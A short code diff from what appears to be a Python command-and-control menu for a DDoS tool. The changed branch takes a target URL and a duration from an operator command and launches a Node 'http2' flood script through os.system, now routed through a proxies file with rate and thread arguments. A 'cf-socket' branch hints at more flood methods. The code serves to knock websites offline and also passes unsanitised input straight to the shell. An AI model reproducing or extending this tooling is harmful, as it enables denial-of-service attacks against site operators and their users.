@@ -295,9 +295,9 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node http2 {url} {time}')
+                os.system(f'node http2 {url} proxies.txt {time} 64 1')
             except IndexError:
-                print('Usage: http2 <url> proxies.txt <time> 64 1')
+                print('Usage: http2 <url> <time>')
                 print('Example: http2 http://segay.com/ 60')
                 
         elif "cf-socket" in cnc:
